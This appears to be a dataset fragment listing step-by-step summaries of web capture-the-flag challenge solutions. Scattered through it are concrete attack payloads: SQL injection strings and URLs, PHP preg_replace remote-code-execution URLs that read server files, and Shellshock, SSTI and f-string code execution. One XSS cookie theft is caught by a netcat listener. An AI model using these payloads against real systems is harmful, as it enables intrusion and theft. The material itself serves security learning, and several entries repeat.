    "Discover another endpoint: http://challenges.auctf.com:30022/hidden/nextstep.php.",
    "Contact the discovered endpoint based on the decoded strings.",
    "Perform a GET request to the discovered endpoint.",
    "Decode the ROT13 encrypted message in the HTTP response.",
    "Perform a POST request to the path provided by the decoded message.",
    "Perform another POST request.",
    "Set a 'flag' variable based on the response of the previous POST request.",
    "Retrieve the flag from the response of the previous POST request.",
    "Connect to URL",
    "Find default Apache2 installation page",
    "Perform URL enumeration",
    "Use 'dirb' tool",
    "Identify server directories",
    "Analyze 'cgi-bin/' directory",
    "Discover 'scriptlet' endpoint",
    "Connect to 'scriptlet' endpoint",
    "Reveal running as 'www-data'",
    "Identify 'scriptlet' vulnerability",
    "Identify Shellshock vulnerability",
    "Exploit Shellshock vulnerability",
    "Determine current user is 'www-data'",
    "Exploit Shellshock vulnerability",
    "Enumerate root directory",
    "Find 'flag.file'",
    "Exploit Shellshock vulnerability",
    "Print contents of 'flag.file'",
    "Identify 'flag.file' contents",
    "Determine it is a hexadecimal representation",
    "Recognize it as a GZip archive",
    "Recreate GZip archive",
    "Use hexadecimal content",
    "Use an editor",
    "Extract 'flag.txt' from the GZip archive",
    "Reveal the flag",
    "Visited the challenge webpage",
    "Checked the webpage source",
    "Accessed 'http://challenges.auctf.com:30020/robots.txt' on the browser",
    "Researched the trivia answer 'Fear the Old Blood'",
    "Performed a HTTP GET request",
    "Added a header named 'answer'",
    "Set the value of the header 'answer' as 'Fear the Old Blood'",
    "Retrieved the flag in the response",
    "Accessed the website.",
    "Found out it is an online calculator.",
    "Made a POST request to the server.",
    "Included a calculation statement in the request.",
    "Submitted a malformed statement.",
    "Triggered an error.",
    "Discovered that the website is using PHP eval() function.",
    "Used PHP system() function.",
    "Executed commands.",
    "Executed 'id' command.",
    "Retrieved user information.",
    "Executed 'ls -al' command.",
    "Listed the directory contents.",
    "Executed 'cat index.php' command.",
    "Printed the content of the index.php file.",
    "Discovered the flag within the content of the index.php file.",
    "Access the website",
    "Determine that the website is an online calculator",
    "Make a POST request",
    "Include a calculation statement in the request",
    "Submit a malformed statement",
    "Determine that the website is using PHP eval() function",
    "Use PHP system() function",
    "Execute commands",
    "Execute 'id' command",
    "Retrieve user information",
    "Execute 'ls -al' command",
    "Retrieve directory listing",
    "Execute 'cat index.php' command",
    "Retrieve content of index.php file",
    "Search for the flag within the content of the index.php file",
    "Analyzed the webpage.",
    "Discovered two strange cookies: 'frequency' and 'transmissions'.",
    "Noticed 'frequency' increments with each page refresh.",
    "Identified that 'transmissions' had a fixed part at the beginning and end.",
    "Identified that 'transmissions' had a variable part in the middle.",
    "Understood that the variable part contained the previous char of the flag.",
    "Understood that the variable part contained the actual char of the flag.",
    "Understood that the variable part contained the index of the actual char.",
    "Wrote a Python script.",
    "Script retrieves all characters.",
    "Script composes the flag.",
    "Implemented a loop in the Python script.",
    "Script iteratively reads the transmissions.",
    "Implemented a condition in the Python script.",
    "Script retrieves cookies from the target page.",
    "Unquoted and cleaned up the cookie values within the Python script.",
    "Appended unique transmission values to a list.",
    "Created another loop in the Python script.",
    "Script composes the flag using the loop.",
    "Iteratively added a character to the flag.",
    "Checking if the character's index matches the desired one.",
    "The script printed out the flag after successful execution.",
    "Attempted to connect to the homepage.",
    "Received an error of HTTP method not allowed.",
    "Tried a wrong HTTP verb.",
    "Server returned all allowed methods.",
    "Experimented with each method.",
    "Found that 'POST' and 'PUT' returned a different result.",
    "Guessed the presence of endpoints.",
    "Tried all HTTP verbs for each endpoint.",
    "Received a PDF file from the '/circle/one/' endpoint.",
    "Received different responses from the '/two/' endpoint with 'PUT' HTTP verb.",
    "Received different responses from the '/two/' endpoint with 'CONNECT' HTTP verb.",
    "Received a PNG image from the 'CONNECT /two/' request.",
    "Received a PNG image with a crossword puzzle from the '/square/' endpoint.",
    "Determined the solution for the crossword puzzle.",
    "Received a webpage from the '/com/seaerch/' endpoint.",
    "Guessed the requirement of an 'application/x-www-form-urlencoded' parameter.",
    "Used the 'flag' value on the '/com/seaerch/' endpoint.",
    "Another part of the flag provided.",
    "Received a message from the '/vim/quit/' endpoint.",
    "Suggested using a query parameter.",
    "Passed a random value.",
    "Revealed the requirement of a 'vim' command.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Put together all obtained parts of the flag.",
    "Guessed the first part of the flag referred to in the PDF.",
    "Combined both parts of the flag to solve the challenge.",
    "Attempted to connect to the homepage.",
    "Received an error of HTTP method not allowed.",
    "Tried a wrong HTTP verb.",
    "Server returned all allowed methods.",
    "Experimented with each method.",
    "Found that 'POST' and 'PUT' returned a different result.",
    "Guessed that endpoints were present.",
    "Tried all HTTP verbs for each endpoint.",
    "Received a PDF file from '/circle/one/' endpoint.",
    "Received different responses from '/two/' endpoint with 'PUT' and 'CONNECT' HTTP verbs.",
    "Received a PNG image from 'CONNECT /two/' request.",
    "Received a PNG image with a crossword puzzle from '/square/' endpoint.",
    "Determined the solution for the crossword puzzle.",
    "Received a webpage from '/com/seaerch/' endpoint.",
    "Guessed that 'application/x-www-form-urlencoded' parameter must be used.",
    "Used the 'flag' value on '/com/seaerch/' endpoint.",
    "Received a message from '/vim/quit/' endpoint.",
    "Passed a random value on the endpoint.",
    "Revealed that a 'vim' command must be used.",
    "Used the value ':wq' for the 'exit' parameter.",
    "Put together all obtained parts of the flag.",
    "Guessed the first part of the flag referred to in the PDF.",
    "Combined both parts of the flag.",
    "Connect to the website",
    "Observe that directory listing is active",
    "Identify 'login.php' and 'login.php.bak' files",
    "Observe the contents of the first page",
    "Note that the message 'Not authenticated' is displayed",
    "Access 'login.php.bak'",
    "View PHP source code",
    "Discover the requirement of the 'otadmin' cookie",
    "Note the regex format /^{\"hash\": [0-9A-Z\"]+}$/",
    "Craft a value for the cookie",
    "Ensure the value is {\"hash\": \"T35T\"}",
    "Examine the script",
    "Find the hint related to cookie value matching MD5 hash of '$cfg_pass' variable",
    "Use the crafted cookie value",
    "Print the hint",
    "Analyze the hint",
    "Realize the issue in the comparison",
    "Identify the type juggling scenario",
    "Note the comparison $session_data['hash'] != strtoupper(MD5($cfg_pass))",
    "Decide to exploit the type juggling scenario",
    "Make an educated guess on the numbers at the beginning of the MD5 string",
    "Create a Python script",
    "Design the script to automate the trial and error process",
    "Exploit the type juggling loophole",
    "Execute the Python script",
    "Find the correct value for the cookie 'otadmin' (\"hash\": 389)",
    "Use the discovered cookie",
    "Reveal the flag: p4{wtf_php_comparisons_how_do_they_work}",
    "Accessed the meme generator web application",
    "Experimented with the meme generator functionality",
    "Noted the server requests",
    "Observed that the web application uses PhantomJS/2.1.1",
    "Researched about PhantomJS/2.1.1",
    "Identified a known vulnerability (CVE-2019-17221)",
    "Used the knowledge of the vulnerability to conclude that the web application potentially parses the HTML content and interpret it",
    "Implied a possibility of Cross-site Scripting (XSS)",
    "Created an XML HTTP request that references the /etc/flag.txt directory",
    "Injected the crafted payload into a request in either the top text",
    "Injected the crafted payload into a request in either the bottom text",
    "Submitted this payload to the meme generator",
    "Realised that the generated PDF had the flag inside",
    "Retrieved the CTF flag",
    "Accessed the meme generator web application.",
    "Engaged with different features of the meme generator.",
    "Took note of the different server requests that were sent as a result.",
    "Identified that the underpinning technology of the web application is PhantomJS/2.1.1.",
    "Conducted a study about PhantomJS/2.1.1.",
    "Found a known vulnerability (CVE-2019-17221) linked with PhantomJS/2.1.1.",
    "Applied the knowledge of the discovered vulnerability to infer certain characteristics of the web application.",
    "Concluded that the web application may interpret HTML content, thus implying a potential for Cross-site Scripting (XSS).",
    "Formulated an XML HTTP request.",
    "Included a reference to the /etc/flag.txt directory in the request.",
    "Introduced the crafted payload into either the top text or bottom text of a request.",
    "Submitted the request containing the crafted payload to the meme generator.",
    "Analyzed the generated PDF.",
    "Discovered that the PDF contains the flag.",
    "Retrieved the CTF flag.",
    "Recognize 'SSTI' in the given URL",
    "Interpret 'SSTI' as a hint to 'Server-Side Template Injection' vulnerabilities",
    "Inject a template operation (7*7)",
    "Verify if the injected template operation (7*7) triggers the SSTI vulnerability",
    "Test the character '%'",
    "Test the character '['",
    "Test the character ']'",
    "Test the character '\"'",
    "Test the character '+'",
    "Test the character '_'",
    "Check if any of the tested characters bypass the template engine",
    "Create a payload",
    "Execute the payload to return all the subclasses",
    "Collect the list of subclasses returned as a result",
    "Find the required (subprocess.Popen) class among the identified subclasses",
    "Determine the position of the (subprocess.Popen) class, which is 407",
    "Use the identified class (subprocess.Popen) to execute the 'id' command",
    "Execute the 'id' command remotely using the identified class",
    "Use the identified class (subprocess.Popen) to list directory content",
    "List directory content remotely using the identified class",
    "Use the identified class (subprocess.Popen) to read the content of 'flag.txt'",
    "Display the content of 'flag.txt' remotely using the identified class",
    "Visit the website http://easy-php.darkarmy.xyz/",
    "Visit http://easy-php.darkarmy.xyz/robots.txt",
    "Discover '?lmao' in the robots.txt file",
    "Open http://easy-php.darkarmy.xyz/?lmao",
    "Observe the PHP code of the website",
    "Notice that the site's PHP code allows for the crafting of 'preg_replace'",
    "Discover that 'preg_replace' is vulnerable to RCE (Remote Code Execution) using '/e'",
    "Trigger phpinfo() output by visiting 'http://easy-php.darkarmy.xyz/?bruh=phpinfo()&nic3=/DarkCON/e'",
    "Discover that the 'is_payload_danger' method prevents certain functions such as 'system'",
    "Use the 'fread' and 'fopen' functions to craft a payload to read 'config.php'",
    "Visit 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=config.php'",
    "Execute the crafted payload",
    "Decode the base64 response",
    "Reveal the source code of 'config.php'",
    "Use the 'glob' function to find interesting files",
    "Discover a file named 'flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Read the file 'flag210d9f88fd1db71b947fbdce22871b57.php' using the same technique applied during reading of 'config.php'",
    "Visit 'http://easy-php.darkarmy.xyz/?bruh=base64_encode(fread(fopen($_GET[%27pwn%27],%27r%27),512))&nic3=/DarkCON/e&pwn=flag210d9f88fd1db71b947fbdce22871b57.php'",
    "Decode the base64 response",
    "Reveal the challenge flag",
    "Perform basic web enumeration.",
    "Identify the presence of a Git repository in the target URL (http://meme-stash.darkarmy.xyz/).",
    "Use the tool 'git-dumper'.",
    "Extract all the contents of the Git repository from the website.",
    "Download all the contents of the Git repository from the website.",
    "Inspect the 'git log'.",
    "View all previous commits in the repository.",
    "Identify a suspicious commit with a message 'oops'.",
    "Recognize the possibility of useful information in previous commits.",
    "Expect to find the flag before the suspicious commit.",
    "Use the 'git diff' command.",
    "Check differences between the suspicious commit and its preceding commit.",
    "Recognize the presence of a file named 'flag.jpg'.",
    "Realize that the file 'flag.jpg' was later removed.",
    "Restore the repository to the previous commit.",
    "Use the 'git checkout' command.",
    "Specify the previous commit that contained the flag ('flag.jpg').",
    "Find the flag file 'flag.jpg'.",
    "Verify that the flag file is present in the checkout version of the repository.",
    "Read the flag value as 'darkCON{g1t_d4_fl4g}'.",
    "Visit the website",
    "Read HTML",
    "Find a comment containing PHP code to upload a file",
    "Note that the PHP code renames the uploaded file with a random name while preserving the file extension",
    "Upload a PHP shell",
    "Note that the PHP shell can be executed by visiting the uploaded file",
    "Run the PHP shell",
    "Note that the execution of the PHP shell was unsuccessful",
    "Add phpinfo() to the code in the PHP shell",
    "Get information about the PHP configuration",
    "Notice that the PHP configuration has several functions disabled",
    "Note that 'scandir' and 'file_get_contents' are not disabled",
    "Write a new PHP exploit",
    "Use 'scandir' and 'file_get_contents' to browse through files in the '/etc' directory",
    "Find the flag, which is meant to be in a file in the '/etc' directory",
    "Create the new PHP exploit",
    "Upload the new PHP exploit",
    "Run the PHP exploit",
    "Get the flag by reading from a file in the '/etc' directory",
    "Note that the flag obtained was 'darkCON{us1ng_3_y34r_01d_bug_t0_byp4ss_d1s4ble_funct10n}'",
    "Connected to the provided web site.",
    "Was presented with an authentication form displaying the user's IP.",
    "Examined the HTML source code of the page.",
    "Revealed default credentials.",
    "Used the default credentials.",
    "Logged in.",
    "Observed User-Agent details.",
    "Observed an image printed as a response to the login.",
    "Attempted to alter the User-Agent during authentication.",
    "Received a SQL error.",
    "SQL injection via User-Agent string was possible.",
    "Decided to leak the database name.",
    "Had to devise a new strategy as this query was of type 'INSERT'.",
    "Implemented an error-based approach.",
    "Used 'Updatexml()' in the SQL payload.",
    "Used the following payload: 'or updatexml(0,concat(0x7e,(SELECT database())),0) or'', '127.0.0.1', 'admin') #.",
    "Received an XPATH syntax error.",
    "Contained the database name.",
    "Used the database name to compose the flag.",
    "Access the website 'http://filereader.darkarmy.xyz/'",
    "Identify the upload form on the website",
    "Understand from the description that an XML External Entity (XXE) vulnerability might be involved",
    "Identify that the form only allows the uploading of PDF and DOCX files",
    "Upload a DOCX file",
    "Observe the output details",
    "Note that the number of pages is shown",
    "Understand that DOCX files are actually a collection of XML files",
    "Create a new DOCX file",
    "Alter the file 'app.xml' inside the new DOCX file",
    "Modify the number of pages stored in 'app.xml'",
    "Inject entity 'xxe' into 'app.xml'",
    "Point 'xxe' to the required file 'file:///flag.txt'",
    "Upload the modified DOCX file",
    "Website parses the XML",
    "Website evaluates the 'xxe' entity",
    "Website displays the content of the '/flag.txt' file",
    "Accessed the provided URL.",
    "Checked the PHP source code.",
    "Saw the criteria for getting the flag printed.",
    "Identified the specific query string parameters needed according to the code.",
    "Identified the required user-agent according to the code.",
    "Identified the need for a 'GET' request with two parameters having the same md5 hash.",
    "Understood from the code snippet that the md5 hash must collide.",
    "Deduced that two different strings should give the same md5 hash.",
    "Used provided hexadecimal values.",
    "Generated two different strings with the same md5 hash.",
    "Used 'hex2bin' PHP function.",
    "Converted the hexadecimal values into binary data.",
    "Checked the equality of generated data from both the hexadecimal values.",
    "Generated the md5 hash for both binary data.",
    "Checked if both md5 hashes matched.",
    "URL encoded the first binary string.",
    "URL encoded the second binary string.",
    "Got two different URL encoded strings.",
    "Checked and confirmed both strings had the same md5 hash.",
    "Constructed the 'GET' request using 'darkctf', 'ctf2020', 'karma', and '2020' query parameters.",
    "Set the 'User-Agent' as per the requirement in the PHP code.",
    "Sent the 'GET' request to the provided web page.",
    "Received the response from the web page.",
    "Identified the received flag.",
    "Visit the challenge URL",
    "Analyze the HTML code of the page",
    "Discover that the guest sign in portal is not implemented",
    "Analyze the provided PCAP file",
    "Identify a packet (#6) in the PCAP file",
    "Find a different URL 'https://freewifi.ctf.umbccd.io/staff.html' in the packet",
    "Access the new URL 'https://freewifi.ctf.umbccd.io/staff.html'",
    "Find the flag on the accessed page",
    "Identify JWT 'identity' cookie as '31337'",
    "Identify JWT 'secret' cookie as 'dawgCTF?heckin#bamboozle'",
    "Identify packet #261 in the capture",
    "Identify packet #263 in the capture",
    "Intercept a GET request to /jwtlogin",
    "Observe the HTTP 401 UNAUTHORIZED status in the response",
    "Use jwt.io tool",
    "Craft a valid JWT with '31337' identity",
    "Sign the JWT with 'dawgCTF?heckin#bamboozle' secret",
    "Send a GET request to /jwtlogin",
    "Include the crafted JWT in the `Authorization` header",
    "Observe the flag in the response from the server",
    "Access the website at 'http://freewifi.ctf.umbccd.io/'.",
    "Observe a login page with two authentication options: username and password, or WifiKey.",
    "Analyze the HTML for possible vulnerabilities.",
    "Observe the presence of a CSRF token.",
    "Recognize the potential CSRF vulnerability based on the CSRF token.",
    "Analyze the provided PCAP file.",
    "Discover POST requests sent to '/forgotpassword.html' page.",
    "Identify the user 'true.grit@umbccd.io' through PCAP analysis.",
    "Understand the functionality and workings of the 'forgot password' feature.",
    "Discover a JavaScript code that copies the email value to the username field.",
    "Intercept the Post Request in the JavaScript code.",
    "Replace the email value in the intercepted Post Request with a controlled one.",
    "Ensure the known username 'true.grit@umbccd.io' remains intact in the manipulated request.",
    "Observe the response received after sending the manipulated request.",
    "Confirm the success message in the response.",
    "Identify the flag hidden in the retrieved response: 'DawgCTF{cl!3nt_s1d3_v@l!d@t!0n_1s_d@ng3r0u5}'.",
    "Connect to the website.",
    "Check the cookies being set.",
    "Download the PCAP file.",
    "Analyze the PCAP file.",
    "Filter for POST requests passing 'passcode' values.",
    "Identify the algorithm mentioned in the cookie value.",
    "Capture wifi nonces.",
    "Apply the algorithm to the captured wifi nonces.",
    "Discover that 'passcode' values are the first 8 characters of the hashed 'nonce' value.",
    "Apply the same process to the challenge's 'nonce' value.",
    "Perform a POST request.",
    "Calculate the 'passcode'.",
    "Retrieve the flag from the response page.",
    "Visit the provided URL",
    "Inspect the source code of the website",
    "Locate an image tag",
    "Check the URL parameter of the image tag",
    "Identify the URL parameter labelled 'flag'",
    "Retrieve the flag from the URL parameter",
    "Visit the given URL",
    "Inspect the source code of the webpage",
    "Find an image tag",
    "Identify the onclick track event",
    "Find the onclick attribute",
    "Identify the JavaScript event in the onclick attribute",
    "Observe the encoded string returned by the event",
    "Analyze the encoded string",
    "Identify the ASCII representation within the encoded string",
    "Open the JavaScript console in the web browser",
    "Decode the ASCII representation to readable text using JavaScript console",
    "Obtain the flag from the decoded text",
    "Find a target website.",
    "Observe a login form with JavaScript check.",
    "Identify that the JavaScript check prevents submission of long passwords.",
    "Discover that the script can be bypassed by disabling JavaScript.",
    "Discover that the script can be bypassed by using a proxy tool for request interception and repetition.",
    "Enter a common password, e.g., 'password'.",
    "Bypass the JavaScript check.",
    "Retrieve the flag successfully.",
    "Access the website.",
    "Observe allowed actions: upload and comment on dog pictures.",
    "Find the endpoint '/dogooo/runcmd' enabling remote shell functionality.",
    "Observe that remote shell functionality is blocked due to 'seccomp' filter preventing 'execve'.",
    "Identify functionalities accessed by authenticated users.",
    "Spot '@login_required' annotations as indicators.",
    "Find the endpoint '/dogooo/user/create' for creating new users.",
    "Observe that it is accessed only by authenticated users.",
    "Identify the publicly accessible functionality '/dogooo/deets/<postid>'.",
    "Observe that comments under a picture can be inserted.",
    "Observe the submission of comments as a two-step process.",
    "Step 1: Insert the comment as a preview.",
    "Step 2: Validate and insert into the database.",
    "Locate the 'get_comments' function within the [loaddata.py](loaddata.py) file.",
    "Identify the code snippet that prints 'self.__dict__' in specific conditions.",
    "Conditions: Comment text contains a format string like '{rating}'.",
    "Verify that the post content is printed with 'self.__dict__' in the preview of the webpage.",
    "Utilize the '{rating[comments][0].__class__.__init__.__globals__}' format string.",
    "Access 'globals' objects using the format string.",
    "Find the database credentials in the output.",
    "Credentials: 'dogooo' for 'db_user' and 'dogZgoneWild' for 'db_pass'.",
    "Authenticate into the system.",
    "Use the database credentials for authentication.",
    "Create new users upon successful authentication.",
    "Verify authentication to the system.",
    "Locate the 'login' method in [dogooo_comments.py](dogooo_comments.py) file.",
    "Identify the usage of Python 3's f-Strings functionality in the 'login' method.",
    "Note that f-Strings can be used to call methods.",
    "Observe the 'get_user_info' method during authentication in the User class.",
    "Note the usage of the 'f()' method on the 'username' field.",
    "Recognize that this can be exploited for login.",
    "Create a new user.",
    "Set the username as '{open('/flag').read()}' to trigger a Remote Code Execution during authentication.",
    "Attempt authentication with the user created.",
    "Observe the redirection upon successful authentication.",
    "Note that the redirected URL contains the flag.",
    "Identify the flag in the URL.",
    "Flag found: 'OOO{did you see my dog}'.",
    "Accessed the web application.",
    "Submitted a text content to a remote S3 bucket.",
    "Defined a GUID for the key.",
    "Retrieved the text content.",
    "Used the GUID to retrieve the content.",
    "Examined the functionality endpoint '/files/'.",
    "Analyzed the provided files.",
    "Confirmed no intentional vulnerabilities within the files.",
    "Investigated the responses received.",
    "Paid particular attention to the HTTP headers: 'Server', 'Via', 'X-Served-By'.",
    "Understood the potential of an 'HTTP Desync Attack' CL.TE scenario.",
    "Viewed the backend infrastructure.",
    "Crafted a malicious HTTP request.",
    "Included a special character between 'Transfer-Encoding:' and 'chunked'.",
    "Prepared for a possible request smuggling attack.",
    "Received a successful response from the webserver.",
    "Indicated the attack has worked.",
    "Executed a GET request.",
    "Read the created item from the request smuggling.",
    "Retrieved a POST request.",
    "Received the final flag in the response.",
    "Recognize the challenge requires locating a flag in /var/www/html/flag.php on a web server",
    "Identify the PHP source code provided that includes a User Submitted file inclusion vulnerability",
    "Craft a POST request to target this vulnerability",
    "Include /var/www/html/flag.php in the POST request",
    "Send the crafted POST request to the server",
    "Receive an HTTP response containing the Flag",
    "Analyzed the source code of the app provided in the challenge.",
    "Observed the user registration process.",
    "Understood that data is packed in 'username:password:admin' format.",
    "Discovered that the value 'false' is forced into the admin field during the normal registration process.",
    "Found that there were no escaping countermeasures for the ':' character.",
    "Crafted a record by setting a password with a ':' character.",
    "Injected the crafted record to usurp the 'false' value in admin field.",
    "Successfully created an admin account.",
    "Used the created admin account to register with the username 'm3ssap0' and password 'pwnd:true'.",
    "Logged in using the newly created admin account.",
    "Retrieved the flag after successful login.",
    "Analyzed given PHP script to understand the functionality of different methods.",
    "Identified the target 'config.php' file.",
    "Inferred that the 'config.php' file must be printed via curl execution.",
    "Understood that to trigger curl execution, 'doit' method must be invoked.",
    "Noted that the 'doit' method is called in the '__destruct()' function.",
    "Understood the conditions for the 'doit' method being called, specifically if present in the '$method' attribute of the destructed object.",
    "Decided to exploit 'unserialize' method.",
    "Planned to craft an object with desired parameters.",
    "Created a PHP script to serialize an object for the exploit.",
    "Adjusted the '$method' attribute in the serialized object.",
    "Set the '$method' attribute in the serialized object to be 'doit'.",
    "Updated the '$url' attribute in the serialized object.",
    "Bypassed localhost address checks by setting the '$url' attribute to 'file:///var/www/html/config.php'.",
    "Recognized a known strange PHP behavior could be exploited to circumvent file extension checks.",
    "Circumvented file extension checks on '.php' by replacing '.' character with '%252e'.",
    "Adjusted payload produced from serialization operation.",
    "Accounted for the replace operation which changed the string length.",
    "URL-encoded the payload.",
    "Updated length of URL string according to the previous string replacement.",
    "Made a GET request with the payload.",
    "Received flag 'F#{wtf_5trp0s_}' in response.",
    "Connect to website",
    "Analyze HTML",
    "Get link to the source code",
    "Connect to source code link",
    "Reveal the structure of the site",
    "Find that the service functions similarly to Pastebin",
    "Understand that it allows the creation and sharing of messages",
    "Understand that exploitation involves creation of a Stored XSS",
    "Understand that the goal is to exfiltrate the session cookies",
    "Find that content of the note is reflected in the source code",
    "Find that content of the note is inserted into the HTML",
    "Note that the const 'note' can be altered",
    "Close the string and insert arbitrary JavaScript",
    "Craft a precise content payload",
    "Create a working XSS",
    "Start a listening host with 'nc -lkv 1337'",
    "Craft a request",
    "Manipulate the HTML structure",
    "Create an insertion point",
    "Craft another post request",
    "Create a secondary note",
    "Pass the malicious note_id from the previous step",
    "Receive the flag from the listening host",
    "Visit the home page of the challenge URL",
    "Read the blog post on the home page",
    "Access the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/robots.txt'",
    "Find the 'robots.txt' file",
    "Read the content of the 'robots.txt' file",
    "Identify the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin' from the 'robots.txt' file",
    "Access the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/admin'",
    "Inspect the HTML source code of the admin page",
    "Discover a comment in the HTML source code referencing a potential vulnerability using TOTP",
    "Attempt to change the input field from 'password' to 'totp'",
    "Observe that the change does not work",
    "Observe the authentication response for a nonexistent user",
    "Observe the authentication response for an existing user with the wrong password",
    "Identify the existing user 'bob' from the authentication response",
    "Monitor the websockets traffic",
    "Observe the packets used for post retrieval",
    "Analyze the websockets packet structure",
    "Determine that the second part of the packet represents the post ID",
    "Note that the post ID is sent as a URL fragment",
    "Inspect the client-side code",
    "Identify that 6 parameters are read from the server response",
    "Recognize the parameters as 'author', 'hidden', 'id', 'postDate', 'text', 'title'",
    "Try SQL Injection on the data passed using fragment values",
    "Perform SQL Injection to read 'username' from 'users'",
    "Discover the SQL Injection payload from the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,username,null,null,null,null/**/from/**/users'",
    "Perform SQL Injection to read all posts from 'posts'",
    "Discover the SQL Injection payload from the URL 'http://challs.houseplant.riceteacatpanda.wtf:30003/#3/**/union/**/select/**/null,null,null,text,null,null/**/from/**/posts'",
    "Discover the flag 'rtcp{WebSock3t5_4r3_SQLi_vu1n3r4b1e_t00_bacfe0}'",
    "Started the CTF Challenge in Houseplant CTF 2020 – Fire/place.",
    "Checked the category and points of the challenge. It was a web category and was worth 1783 points.",
    "Received instructions about the presence of certain elements inside the HTML page.",
    "Received fire-place[0].html e4a4c2321d18246d027184605ca52866 as the challenge.",
    "Downloaded the provided HTML file.",
    "Observed that the HTML file establishes a connection to a Firestore environment.",
    "Explored the Firestore environment and found a canvas for users.",
    "Observed that colored pixels on the canvas get stored into Firestore repository.",
    "Opened the browser console.",
    "Started interacting with the Firebase installation using the browser console.",
    "Analyzed the client source code.",
    "Read the official Firebase Firestore documentation.",
    "Used the provided code snippet.",
    "Retrieved data from each document in the Firestore database using the code snippet.",
    "Verified the contents of the retrieved data.",
    "Found that the data are structures that contain all the RGB values for pixels.",
    "Tried accessing a document called 'flag' in the Firestore database.",
    "Verified the contents of the 'flag' document.",
    "Found that the document contained the lyrics of a song and the required flag.",
    "Located the flag within the 'flag' document data.",
    "Identified the flag to be 'rtcp{d0n't_g1ve_us3rs_db_a((3ss}'.",
    "Recognized that the challenge name and challenge statement hinted at SQL injection.",
    "Visited the webpage.",
    "Identified an authentication form on the webpage.",
    "Inspected the HTML source code.",
    "Found an interesting comment in the HTML source code: '?sauce'.",
    "Typed the URL 'http://challs.houseplant.riceteacatpanda.wtf:30001/?sauce' in the web browser and visited the webpage.",
    "Inspected the source code of the newly accessed webpage.",
    "Recognized that the source code is written in PHP.",
    "Analyzed the PHP code in the source.",
    "Identified that the PHP code output the flag when a specific username 'flagman69' is used.",
    "Evaluated the PHP code to understand how user input is processed.",
    "Identified that the user input is directly concatenated to the SQL query ",
    "Concluded the webpage is vulnerable to SQL injection attacks.",
    "Observed the source code closely for additional checks or controls.",
    "Identified an additional control which blocks SQL injection if password contains the number '1'.",
    "Attempted to bypass password check using SQL injection.",
    "Logged into the authentication form successfully, but noticed the flag didn't print.",
    "Conjectured that the 'flagman69' user may not exist in the database given the failed flag output.",
    "Prepared an SQL injection using 'UNION' clause to search for 'flagman69' user.",
    "Attempted the SQL injection on the authentication form.",
    "Received SQL query result and examined the output.",
    "Discovered that the 'users' table had 3 columns.",
    "Identified that the second column contains usernames.",
    "Used the gained information about the 'users' table structure to craft a new SQL injection.",
    "Crafted the SQL injection to directly pass 'flagman69' as the value for the username column using the 'UNION' clause.",
    "Implemented the newly crafted SQL injection on the authentication form.",
    "Got authenticated as 'flagman69'.",
    "Observe a successful flag output after authentication.",
    "Analyze the HTML source code.",
    "Find the endpoint of the QR code service.",
    "Identify that the QR Code produced only contains the first character inserted.",
    "Use backticks to confirm remote code execution (RCE).",
    "Send the command `echo 'X'`.",
    "Receive a QR code of the letter 'X'.",
    "Write a Python script.",
    "Exfiltrate the output of executed commands.",
    "Create a function `execute_command` in the Python script.",
    "Run commands and increase the command output slice index until the result was empty.",
    "Create a function `http_get` in the Python script.",
    "Get the response.",
    "Check if PNG was found in the response.",
    "Launch remote commands using the Python script.",
    "Check the output of the command \"whoami\".",
    "List the files.",
    "Retrieve the flag from the file \"flag.txt\".",
    "Access the given URL.",
    "Review the source code of the homepage.",
    "Click on the link to enter the chat.",
    "Choose 'discord' as the OAuth2 Identity Provider upon redirection.",
    "Recognize that the 'with' HTTP GET parameter can be manipulated.",
    "Replace the existing 'with' value, 'discord', with a different value, 'foo'.",
    "Receive an HTTP 200 OK status code.",
    "Replace the 'with' value with the word 'flag'.",
    "Follow the redirection link after replacing the 'with' value with 'flag'.",
    "View the page with the flag, 'rtcp{rtcp-*is-s/ort-of-se1fh0st3d}'.",
    "Access the challenge PHP URL",
    "Review the presented source code",
    "Identify the need to bypass server checks",
    "Craft serialized input",
    "Pass serialized input via 'id' HTTP GET parameter",
    "Pass through certain PHP code",
    "Create PHP payload",
    "Ensure the user's name and password are equal to the secret",
    "Build URL",
    "Pass payload as parameter",
    "Receive partial flag",
    "Successful bypass of initial server checks",
    "Identify additional server check constraints",
    "Research ways to bypass PHP constraints",
    "Introduce additional PHP code",
    "Bypass further server checks",
    "Execute contents of another HTTP GET parameter",
    "Perfect payload",
    "Add GET parameter to final URL",
    "Call a specific function",
    "Access flag",
    "Successful bypass of all server checks",
    "Inspect the source code of the website.",
    "Identify what server-side checks are being done.",
    "Study the source code.",
    "Identify the checks for specific patterns.",
    "Determine which patterns will allow or block requests.",
    "Identify the first check.",
    "Observe that the first check points to a GET parameter with underscores.",
    "Recognize that query string cannot have underscores.",
    "Research if PHP manipulates input parameters' names.",
    "Look into how PHP removes whitespaces from input parameters' names.",
    "Investigate how PHP converts characters into underscores in input parameters' names.",
    "Write a PHP program.",
    "Check if characters are converted to underscores in the program.",
    "Enumerate the characters that are converted to underscores.",
    "Use the output of the script.",
    "Identify the character from the script output.",
    "Craft a URL using the identified character.",
    "Check the website response.",
    "Use the newly crafted URL for the website response check.",
    "Analyze the remaining check in the source code.",
    "Find a way to bypass the remaining check.",
    "Research if 'ereg' instruction can be bypassed.",
    "Investigate if injecting a NULL byte can bypass the 'ereg' instruction.",
    "Formulate the final URL.",
    "Inject a NULL byte into the final URL.",
    "Include the necessary characters in the final URL.",
    "Use the final URL.",
    "Send a request to the server using the final URL.",
    "Successfully bypass the checks in the source code.",
    "Capture the flag.",
    "Extract the flag from the server response.",
    "Initialize CTF task.",
    "Notice the name 'We will we will Shock You' as a hint towards Shellshock vulnerability.",
    "Cite the page http://104.197.168.32:17012/index.html as the challenge target.",
    "Identify the page as having an Apache2 default index.",
    "Analyze the HTML source of the page.",
    "Look for any hidden or obscured data.",
    "Find a commented item in the HTML source of the page.",
    "Request http://104.197.168.32:17012/bashferno.cgi.",
    "Receive HTML content suggesting Shellshock vulnerability.",
    "Try to exploit Shellshock.",
    "Inject commands via 'User-Agent' HTTP header using curl command.",
